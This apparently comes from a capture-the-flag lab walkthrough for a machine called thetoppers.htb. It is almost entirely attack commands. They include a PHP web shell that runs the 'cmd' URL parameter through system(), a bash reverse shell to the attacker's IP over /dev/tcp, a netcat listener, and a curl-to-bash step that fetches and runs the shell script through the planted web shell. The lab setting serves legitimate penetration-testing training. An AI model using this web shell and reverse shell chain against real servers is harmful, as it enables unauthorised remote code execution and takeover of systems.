The system() function which takes the URL parameter cmd as an input and executes it as a system command.

*Create php file to upload*

``
echo '<?php system($_GET["cmd"]); ?>' > shell.php
``

*Create reverse shell.sh*

``
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
``

*Start netcat listener on port 1337*

``
nc -nvlp 1337
``

*Start webserver on our machine, need to be run in the directory of reverse shell file*

``
python3 -m http.server 8000
``

*We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
in order to execute it*

``
http://thetoppers.htb/shell.php?cmd=curl%20<IPADRESS>:8000/shell.sh|bash
``

*Shell avalaible on corresponding listening port from netcat*
